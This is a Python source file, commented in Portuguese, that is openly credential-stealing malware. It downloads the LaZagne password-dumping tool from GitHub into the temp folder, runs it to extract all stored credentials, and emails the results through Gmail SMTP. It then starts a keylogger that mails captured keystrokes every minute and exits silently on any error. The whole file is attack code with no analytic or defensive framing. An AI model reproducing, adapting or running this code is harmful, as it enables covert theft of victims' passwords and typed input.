import pynput.keyboard, threading, sys, requests, smtplib, subprocess, os, tempfile, webbrowser, pyautogui

url = 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe'
#email = 'x'
#senha = Senha do aplicativo


def download(url):
    diretoriotemp = tempfile.gettempdir()
    os.chdir(diretoriotemp)
    req = requests.get(url)
    nome = url.split('/')[-1]
    with open(nome, 'wb') as f:
        f.write(req.content)


def extrair():
    comando = 'laZagne.exe all'
    global mensagem
    mensagem = subprocess.check_output(comando, shell=True)
    os.remove('laZagne.exe')


def enviaremail(email, senha, mensagem):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, senha)
    server.sendmail(email, email, mensagem)


class Keylogger:
    def __init__(self, tempo, email, senha):
        self.log = 'Iniciado'
        self.tempo = tempo
        self.email = email
        self.senha = senha

    def addlog(self, string):
        self.log = self.log + string

    def apertou(self, tecla):
        try:
            contlog = str(tecla.char)
        except AttributeError:
            if str(tecla) == 'Key.space':
                contlog = ' '
            elif str(tecla) == 'Key.backspace':
                contlog = ' <--(Apagou algo)'
            else:
                contlog = " " + str(tecla) + " "
        self.addlog(contlog)

    def enviar(self):
        self.configemail(self.email, self.senha, self.log)
        self.log = ''
        timer = threading.Timer(self.tempo, self.enviar)
        timer.start()

    def configemail(self, email, senha, mensagem):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.senha)
        server.sendmail(self.email, self.email, mensagem)
        server.quit()

    def iniciar(self):
        escuta = pynput.keyboard.Listener(on_press=self.apertou)
        with escuta:
            self.enviar()
            escuta.join()


key = Keylogger(60, email, senha)

if __name__ == "__main__":
    try:
        download(url)
        extrair()
        enviaremail(email, senha, mensagem)
        key.iniciar()
    except:
        sys.exit()


